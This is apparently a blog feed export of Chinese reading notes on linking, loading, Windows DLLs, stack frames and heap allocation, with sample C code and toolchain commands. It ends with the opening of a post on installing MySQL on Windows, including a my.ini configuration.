<h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><p>堆和栈在进程的虚拟空间中也是以VMA（Virtual Memory Area虚拟内存区域）的形式存在</p>
<h4 id="进程虚拟地址空间小结"><a href="#进程虚拟地址空间小结" class="headerlink" title="进程虚拟地址空间小结"></a>进程虚拟地址空间小结</h4><ol>
<li>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间</li>
<li>基本原则是将相同权限属性的、有相同影像文件的映射成一个VMA</li>
<li>一个进程基本上可以分成4中VMA</li>
</ol>
<h4 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h4><ul>
<li>测试 malloc 最大内存申请量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> maximum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> blocksize[] = &#123; <span class="number">1024</span> * <span class="number">1024</span>,<span class="number">1024</span>,<span class="number">1</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> i, count;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (count = <span class="number">1</span>;; count++) &#123;</span><br><span class="line">			<span class="keyword">void</span>* block = <span class="built_in">malloc</span>(maximum + blocksize[i] * count);</span><br><span class="line">			<span class="keyword">if</span> (block) &#123;</span><br><span class="line">				maximum = maximum + blocksize[i] * count;</span><br><span class="line">				<span class="built_in">free</span>(block);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;maximum malloc size = %u bytes\n&quot;</span>, maximum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在我的 Linux 环境（64 位的虚拟机环境）下，结果大约是 2.8 GB  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836201223-444f74dd-6b41-4093-87ff-93d57e647f7b.png" alt="image.png"></p>
<ul>
<li>在我的 Windows 环境（64 位）下，结果大约是 1.8 GB</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836491880-d01a62c4-fd3d-4097-8689-b1ad5f9d2cd1.png" alt="image.png"></p>
<ul>
<li>影响 malloc 最大内存申请量的因素<ul>
<li>操作系统版本</li>
<li>程序本身大小</li>
<li>用到的动态/共享库数量、大小</li>
<li>程序栈数量、大小</li>
</ul>
</li>
</ul>
<h3 id="Linux-内核装载-ELF-的过程"><a href="#Linux-内核装载-ELF-的过程" class="headerlink" title="Linux 内核装载 ELF 的过程"></a>Linux 内核装载 ELF 的过程</h3><h4 id="1-用户层面"><a href="#1-用户层面" class="headerlink" title="1 用户层面"></a>1 用户层面</h4><ul>
<li>bash 进程调用 <code>fork()</code> 创建一个新的进程</li>
<li>新的进程调用 <code>execve()</code> 执行指定 ELF </li>
</ul>
<h4 id="2-内核层面"><a href="#2-内核层面" class="headerlink" title="2 内核层面"></a>2 内核层面</h4><p>进入 <code>execve()</code> 系统调用后</p>
<ul>
<li>内核中 <code>execve()</code> 入口是 <code>sys_execve()</code>，<code>sys_execve()</code> 进行一些参数的检查复制后，调用 <code>do_execve()</code> </li>
<li><code>do_execve()</code> 查找被执行的文件，并读取文件的前 128 个字节，判断文件格式。然后调用 <code>search_binary_handle()</code> 搜索合适的装载处理过程。</li>
<li>针对 ELF 的装载处理过程是 <code>load_elf_binary()</code> </li>
<li>装载处理完成后，返回至 <code>do_execve()</code> 再执行返回至 <code>sys_execve()</code> ，随即从内核态返回到用户态，EIP 寄存器直接跳转到 ELF 程序入口地址，新的程序开始执行，ELF 文件装载完成。</li>
</ul>
<h3 id="Windows-PE-的装载"><a href="#Windows-PE-的装载" class="headerlink" title="Windows PE 的装载"></a>Windows PE 的装载</h3><ul>
<li>读取文件的第一个页（其中包含 DOS 头，PE 文件头和段表）</li>
<li>检查进程地址空间中，目标地址是否可用，不可用则另选一个装载地址（针对 DLL）</li>
<li>使用段表提供的信息，将 PE 文件中所有的段一一映射到地址空间中相应的位置</li>
<li>如果装载地址不是目标地址，则 Rebasing</li>
<li>装载所有需要的 DLL</li>
<li>将 PE 文件中所有导入的符号进行符号解析</li>
<li>根据 PE 头中指定的参数，建立初始化栈和堆</li>
<li>建立主线程并启动进程</li>
</ul>
<h2 id="第九章-Windows-下的动态链接"><a href="#第九章-Windows-下的动态链接" class="headerlink" title="第九章 Windows 下的动态链接"></a>第九章 Windows 下的动态链接</h2><h3 id="9-1-DLL-简介"><a href="#9-1-DLL-简介" class="headerlink" title="9.1 DLL 简介"></a>9.1 DLL 简介</h3><p>DLL 即动态链接库 Dynamic-Link Library。</p>
<ul>
<li>DLL 与 ELF 的区别：ELF 中代码段是地址无关的，可以实现进程间共享一份代码；DLL 的代码不是地址无关的，只能在某些情况下可以被多个进程共享</li>
</ul>
<h4 id="9-1-1-如何创建DLL"><a href="#9-1-1-如何创建DLL" class="headerlink" title="9.1.1 如何创建DLL"></a>9.1.1 如何创建DLL</h4><ul>
<li>MSVC 编译器工具路径 C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64，可以在开始菜单进入 Command Prompt 使用 cl</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009002528-08db24aa-9b77-463c-881a-7e5a3c42b226.png" alt="img"></p>
<ul>
<li>Math.c 示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__declspec(dllexport) double Add(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Sub(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Mul(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>cl /LDd Math.c</code> 生成 Debug 版的 DLL（/LD 是 Release 版的 DLL）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009060202-324978ed-f44d-42c9-bfc3-ca24b1335e34.png" alt="img"></p>
<ul>
<li>生成的 4 个文件默认输出到 C:\Windows\System32，其中 Math.dll 就是我们需要的文件</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009150490-b5805769-5f18-48a4-9b52-2c8a8551b5f8.png" alt="img"></p>
<ul>
<li><code>dumpbin /EXPORTS Math.dll</code> （dumpbin 工具和 cl 在同一目录）查看 DLL 的导出符号</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009490802-53309843-8d54-4191-b2dd-e0a9d0dec258.png" alt="img"></p>
<h4 id="9-1-2-如何使用-DLL"><a href="#9-1-2-如何使用-DLL" class="headerlink" title="9.1.2 如何使用 DLL"></a>9.1.2 如何使用 DLL</h4><h5 id="a-静态链接（dllimport-导入符号）"><a href="#a-静态链接（dllimport-导入符号）" class="headerlink" title="a. 静态链接（dllimport 导入符号）"></a>a. 静态链接（dllimport 导入符号）</h5><ul>
<li><code>__declspec(dllimport)</code> 显式声明某个符号为导入符号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">__declspec(dllimport) double Sub(double a, double b);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    double result = Sub(3.0, 2.0);</span><br><span class="line">    printf(&quot;Result = %f\n&quot;, result);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>cl /c TestMath.c</code> 将 c 代码编译成 obj，注意 command prompt 输出默认都在 C:\Windows\System32</p>
</li>
<li><p><code>link TestMath.obj Math.lib</code> 使用链接器 TestMath.obj 和 Math.lib 链接在一起，生成 TestMath.exe 文件</p>
</li>
<li><p>Math.lib 装的是什么：其包含了 TestMath.o 链接 Math.dll 时所需的导入符号以及一部分“桩”代码（“胶水”代码），以便于将程序和 DLL 粘在一起。这样的 lib 文件又被称为<strong>导入库（Import Library）</strong></p>
</li>
<li><p>在命令行运行该文件，可以正常输出结果</p>
</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619010275975-b399b132-39b8-4da3-a527-06a1e32ba7eb.png" alt="img"></p>
<h5 id="b-运行时链接（LoadLibrary-运行时加载）"><a href="#b-运行时链接（LoadLibrary-运行时加载）" class="headerlink" title="b. 运行时链接（LoadLibrary 运行时加载）"></a>b. 运行时链接（LoadLibrary 运行时加载）</h5><ul>
<li><p>LoadLibrary 装载一个 DLL 到进程的地址空间</p>
</li>
<li><p>GetProcAddress 查找某个符号的地址</p>
</li>
<li><p>FreeLibrary 卸载已装载的模块</p>
</li>
<li><p>示例代码：runtimeLink.c</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef double (*Func) (double, double);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    Func function;</span><br><span class="line">    double result;</span><br><span class="line"></span><br><span class="line">    // Load DLL</span><br><span class="line">    HINSTANCE hinstLib = LoadLibrary(&quot;Math.dll&quot;);</span><br><span class="line">    if (hinstLib == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to load DLL\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Get function address</span><br><span class="line">    function = (Func)GetProcAddress(hinstLib, &quot;Add&quot;);</span><br><span class="line">    if (function == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to find DLL function\n&quot;);</span><br><span class="line">        FreeLibrary(hinstLib);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Call function</span><br><span class="line">    result = function(1.0, 2.0);</span><br><span class="line"></span><br><span class="line">    // Unload DLL file</span><br><span class="line">    FreeLibrary(hinstLib);</span><br><span class="line"></span><br><span class="line">    // Display result</span><br><span class="line">    printf(&quot;Result = % f\n&quot;, result);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译：<code>cl runtimeLink.c</code> ，得到 runtimeLink.exe ，在命令行运行结果如下。成功调用了 Math.dll 中的 Add 函数  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619092840542-0d0a4232-47e2-4caa-9e33-100368967b7a.png" alt="img"></p>
<h3 id="9-2-符号导入导出表"><a href="#9-2-符号导入导出表" class="headerlink" title="9.2 符号导入导出表"></a>9.2 符号导入导出表</h3><h4 id="9-2-1-导出表"><a href="#9-2-1-导出表" class="headerlink" title="9.2.1 导出表"></a>9.2.1 导出表</h4><h5 id="a-什么是导出表"><a href="#a-什么是导出表" class="headerlink" title="a. 什么是导出表"></a>a. 什么是导出表</h5><p>导出表集中了所有导出的符号，提供了符号名与符号地址的映射。</p>
<ul>
<li><p>路径：C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\um\winnt.h</p>
</li>
<li><p>导出表就是其中的 _IMAGE_EXPORT_DIRECTORY 结构体</p>
</li>
<li><p>最后三个成员指向三个重要数组，分别是 导出地址表（EAT，Export Address Table），符号名表（Name Table）和名字序号对应表（Name-Ordinal Table）</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<h5 id="b-怎么查看可以导出的函数"><a href="#b-怎么查看可以导出的函数" class="headerlink" title="b. 怎么查看可以导出的函数"></a>b. 怎么查看可以导出的函数</h5><ul>
<li><code>dumpbin /DIRECTIVES Math.obj</code></li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094010753-1388b44b-58df-4453-88d2-110c69e958a4.png" alt="img"></p>
<h5 id="c-怎么指定导出的符号"><a href="#c-怎么指定导出的符号" class="headerlink" title="c. 怎么指定导出的符号"></a>c. 怎么指定导出的符号</h5><ul>
<li><code>link Math.obj /DLL /EXPORT:Add</code> （会生成三个文件）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094061970-f06726fb-76b3-4e85-bd18-255ba04940e5.png" alt="img"></p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094414360-aefcbd62-619b-400b-9fc1-e6c72fe05224.png" alt="img"></p>
<h4 id="9-2-2-EXP-文件产生的原因"><a href="#9-2-2-EXP-文件产生的原因" class="headerlink" title="9.2.2 EXP 文件产生的原因"></a>9.2.2 EXP 文件产生的原因</h4><ul>
<li><p>链接器创建 DLL 时与静态链接一样采用两遍扫描过程：</p>
</li>
<li><p>第一遍：遍历所有目标文件并收集所有导出符号信息，创建 DLL 导出表。链接器把导出表放到创建 DLL 时产生的临时文件 EXP 中</p>
</li>
<li><p>第二遍：链接器把 EXP 和其他输入的目标文件链接在一起并输出 DLL</p>
</li>
</ul>
<h4 id="9-2-3-导入表"><a href="#9-2-3-导入表" class="headerlink" title="9.2.3 导入表"></a>9.2.3 导入表</h4><ul>
<li><code>dumpbin /IMPORTS Math.dll</code> 查看导入了哪些函数</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619095216680-6c57a4fd-d8b1-4a69-bbe8-8ef4ec9ff4c8.png" alt="img"></p>
<ul>
<li><p>结构</p>
</li>
<li><p>FirstThunk 指向导入地址数组 IAT</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class="line">                                            // -1 if bound, and real date\time stamp</span><br><span class="line">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class="line">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<h3 id="9-3-DLL-优化"><a href="#9-3-DLL-优化" class="headerlink" title="9.3 DLL 优化"></a>9.3 DLL 优化</h3><ul>
<li><p>重定及地址（Rebasing）</p>
</li>
<li><p>使用序号导入（只比函数名导入快一点点，另外，Windows API 的导入不能用序号，因为不同版本中函数名不变但序号是不断变化的）</p>
</li>
<li><p>DLL 绑定（导出函数地址保存到导入表）</p>
</li>
</ul>
<h3 id="9-4-C-与动态链接"><a href="#9-4-C-与动态链接" class="headerlink" title="9.4 C++ 与动态链接"></a>9.4 C++ 与动态链接</h3><p>使用 C++ 写动态链接库时，需要注意：</p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619096253652-42f71892-2225-4d6b-a3a2-67e6886b7d51.png" alt="img"></p>
<h2 id="第四部分-库与运行库"><a href="#第四部分-库与运行库" class="headerlink" title="第四部分 库与运行库"></a>第四部分 库与运行库</h2><h2 id="第十章-内存"><a href="#第十章-内存" class="headerlink" title="第十章 内存"></a>第十章 内存</h2><h3 id="10-1-Linux-下进程地址空间布局"><a href="#10-1-Linux-下进程地址空间布局" class="headerlink" title="10.1 Linux 下进程地址空间布局"></a>10.1 Linux 下进程地址空间布局</h3><ul>
<li>其中动态链接库映射区，用于映射装载的动态链接库。在 Linux 中，如果可执行文件依赖其他共享库，系统就会在 0x40000000 开始处分配相应的空间，将共享库载入该空间</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619167570197-e21929bd-23f3-40b3-9b38-01a078bdb788.png" alt="img"></p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
<li><p>Q: 程序出现“段错误（segment fault）”或者“非法操作，该内存地址不能 read/write”的原因</p>
</li>
<li><p>A: 这时典型的非法指针解引用造成的错误。最普遍的原因有两种</p>
</li>
<li><p>程序员将指针初始化为 NULL，之后没有给一个合理的值就开始使用</p>
</li>
<li><p>程序员没有初始化栈上的指针，指针的值一般会是随机数，之后就直接开始使用</p>
</li>
</ul>
<ul>
<li>Q: 堆总是向上增长吗？</li>
<li>A: 不是，Windows 里大部分堆使用 HeapCreate 产生，其不遵循向上增长这个规律。</li>
</ul>
<h3 id="10-2-栈与调用惯例"><a href="#10-2-栈与调用惯例" class="headerlink" title="10.2 栈与调用惯例"></a>10.2 栈与调用惯例</h3><h4 id="10-2-1-栈和堆栈帧"><a href="#10-2-1-栈和堆栈帧" class="headerlink" title="10.2.1 栈和堆栈帧"></a>10.2.1 栈和堆栈帧</h4><ul>
<li><strong>栈</strong>是向下（低地址）增长的，栈顶由 esp 寄存器进行定位。压栈使栈顶地址减小，弹出使栈顶地址增大。</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169270677-d5a32c6e-fbe0-4b51-8389-7f0c54e1a248.png" alt="img"></p>
<ul>
<li>栈保存了一个函数调用所需的维护信息：<strong>堆栈帧</strong>（或<strong>活动记录</strong>）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169442560-7ceae2a4-c77e-4147-8c65-7fabad39cce1.png" alt="img"></p>
<h4 id="10-2-2-反汇编示例"><a href="#10-2-2-反汇编示例" class="headerlink" title="10.2.2 反汇编示例"></a>10.2.2 反汇编示例</h4><ul>
<li>示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int foo()</span><br><span class="line">&#123;</span><br><span class="line">    return 123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169584780-ca3eff52-29ad-418a-9370-c58aad69e6f6.png" alt="img"></p>
<h4 id="10-2-3-烫烫烫烫"><a href="#10-2-3-烫烫烫烫" class="headerlink" title="10.2.3 烫烫烫烫.."></a>10.2.3 烫烫烫烫..</h4><ul>
<li><p>Q：为什么常看到一些没有初始化的变量或内存区域的值是“烫”？</p>
</li>
<li><p>示例代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char p[12];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加断点调试监视 p 的数据，会发现  </p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619170073349-5f03b8c4-aa2f-41a7-9574-7f47c3757542.png" alt="img"></p>
<ul>
<li>A：因为加入调试信息时，会将所有分配出来的栈空间的每个字节都初始化为 0xCC，两个连续排列的 0xCC 的汉字编码就是烫。</li>
</ul>
<p>这仅作为变量是否已经初始化的<strong>参考</strong>，并不能以此为证据，有的编译器会使用 0xCDCDCDCDCD 作为未初始化标记，这时会看到汉字 屯屯</p>
<h4 id="10-2-4-mov-edi-edi"><a href="#10-2-4-mov-edi-edi" class="headerlink" title="10.2.4 mov edi, edi"></a>10.2.4 mov edi, edi</h4><ul>
<li>在 Windows 的函数里，有些函数尽管使用标准的进入指令序列，但在这些指令之前却插入了一些特殊内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edi, edi</span><br></pre></td></tr></table></figure>

<p>这条指令暂时没有什么用处，在汇编之后会变成一个占用两个字节的机器码，纯粹为占位而存在。出于某些目的（如 Hook 技术），可以将占用两个字节的 <code>mov edi, edi</code> 指令替换成另一个 jmp 指令，原函数的调用就会被转换为新函数的调用。</p>
<h4 id="10-2-5-调用惯例"><a href="#10-2-5-调用惯例" class="headerlink" title="10.2.5 调用惯例"></a>10.2.5 调用惯例</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619358420401-e7a9608f-ef7f-4974-9a43-15201919d152.png" alt="img"></p>
<h3 id="10-3-堆"><a href="#10-3-堆" class="headerlink" title="10.3 堆"></a>10.3 堆</h3><h4 id="10-3-1-malloc-怎么实现的"><a href="#10-3-1-malloc-怎么实现的" class="headerlink" title="10.3.1 malloc 怎么实现的"></a>10.3.1 malloc 怎么实现的</h4><p>程序向操作系统申请一块适当大小的堆空间，然后由程序自己管理这块空间，具体来讲，管理堆空间分配的往往是程序的运行库</p>
<ul>
<li>Q: malloc 申请的内存，进程结束后还会存在吗？</li>
<li>A: 不会，进程结束后，会被操作系统关闭或回收。</li>
</ul>
<ul>
<li><p>Q: malloc 申请的空间是连续的吗？</p>
</li>
<li><p>A: 虚拟空间是连续的，物理空间不一定连续。</p>
</li>
</ul>
<h4 id="10-3-2-Linux-进程堆管理"><a href="#10-3-2-Linux-进程堆管理" class="headerlink" title="10.3.2 Linux 进程堆管理"></a>10.3.2 Linux 进程堆管理</h4><p>Linux 下的进程管理稍微复杂些，它提供了两种堆空间分配方式，即两个系统调用：</p>
<ul>
<li><code>brk()</code>系统调用：设置进程数据段的结束地址</li>
<li><code>mmap()</code> 的作用和 Windows 下的 VirtualAlloc 很相似：向系统申请一段虚拟地址空间</li>
</ul>
<h4 id="10-3-3-Windows-进程堆管理"><a href="#10-3-3-Windows-进程堆管理" class="headerlink" title="10.3.3 Windows 进程堆管理"></a>10.3.3 Windows 进程堆管理</h4><ul>
<li><code>VirtualAlloc()</code></li>
</ul>
<p>首先通过 <code>VirtualAlloc()</code> 向系统一次性批发大量空间，然后根据需要分配给程序</p>
<p>分配算法位于 <strong>堆管理器（Heap manager）</strong>，堆管理器提供了 API：</p>
<ul>
<li><p>HeapCreate</p>
</li>
<li><p>HeapAlloc</p>
</li>
<li><p>HeapFree</p>
</li>
<li><p>HeapDestroy</p>
</li>
</ul>
<h4 id="10-3-4-堆分配算法"><a href="#10-3-4-堆分配算法" class="headerlink" title="10.3.4 堆分配算法"></a>10.3.4 堆分配算法</h4><p>最基本的是空闲链表和位图</p>
<h5 id="a-空闲链表-（Free-List）"><a href="#a-空闲链表-（Free-List）" class="headerlink" title="a. 空闲链表 （Free List）"></a>a. 空闲链表 （Free List）</h5><ul>
<li><p><strong>概念：</strong>把堆中空闲块按链表的方式连接起来。用户请求一块空间时，遍历，找到合适大小的块并将它拆分；用户释放空间时把它合并到空闲链表中。</p>
</li>
<li><p><strong>优点：</strong>实现简单</p>
</li>
<li><p><strong>弊端：</strong>一旦链表被破坏，或者记录长度的四个字节被破坏，整个堆就无法工作。而这些数据恰巧很容易被越界读写接触到。</p>
</li>
</ul>
<h5 id="b-位图-（Bitmap）"><a href="#b-位图-（Bitmap）" class="headerlink" title="b. 位图 （Bitmap）"></a>b. 位图 （Bitmap）</h5><ul>
<li><p><strong>概念：</strong>把整个堆划分成大量的<strong>块</strong>（block），每个块大小相同。当用户请求内存时，总是分配整数个块给用户，第一个块作为已分配区域的<strong>头（Head）</strong>，其余的作为<strong>主体（Body）</strong>。我们可以用一个整数数组记录块的使用情况，每个块只有 <strong>头、主体、空闲</strong> 三种状态，所以可以用两位表示状态，所以称为位图</p>
</li>
<li><p><strong>优点：</strong>快、稳定、易于管理</p>
</li>
<li><p><strong>弊端：</strong></p>
</li>
<li><p>分配内存时容易产生碎片</p>
</li>
<li><p>堆很大或者块很小时，位图就会很大，可能失去 cache 命中率高的优势，而且会浪费一定的空间。（针对这种情况可以用多级位图）</p>
</li>
</ul>
<h5 id="c-对象池"><a href="#c-对象池" class="headerlink" title="c. 对象池"></a>c. 对象池</h5><ul>
<li><strong>使用场景：</strong>被分配对象的大小是较为<strong>固定</strong>的几个值</li>
<li><strong>概念：</strong>如果每次分配空间大小都一样，那就可以按这个大小作为单位，把整个堆空间划分成大量的小块，每次请求只要找一小块。</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>计算机理论</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的安装与重新安装</title>
    <url>/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="1-下载安装-MySQL-1"><a href="#1-下载安装-MySQL-1" class="headerlink" title="1 下载安装 MySQL[1]"></a>1 下载安装 MySQL[1]</h2><ul>
<li><a href="https://dev.mysql.com/downloads/mysql/">下载地址</a> </li>
<li>解压缩，并进入目录，新建 my.ini 配置文件，内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line"># 设置3306端口</span><br><span class="line">port = 3306</span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=D:\mysql-8.0.24-winx64</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=20</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br></pre></td></tr></table></figure>

<ul>
<li>进入 bin 目录，初始化数据库 <code>mysqld --initialize --console</code> ，完成后得到初始密码 <code>Jm&gt;)=CuKn2ss</code> </li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618907983989-09269ece-956b-4449-96df-9dc4ffc0eeba.png" alt="img"></p>
<ul>
<li><strong>安装：</strong> <code>mysqld install</code>（ 注意需要以管理员身份打开 cmd，否则执行该命令时会报 <code>Install/Remove of the Service Denied!</code> ）</li>
</ul>
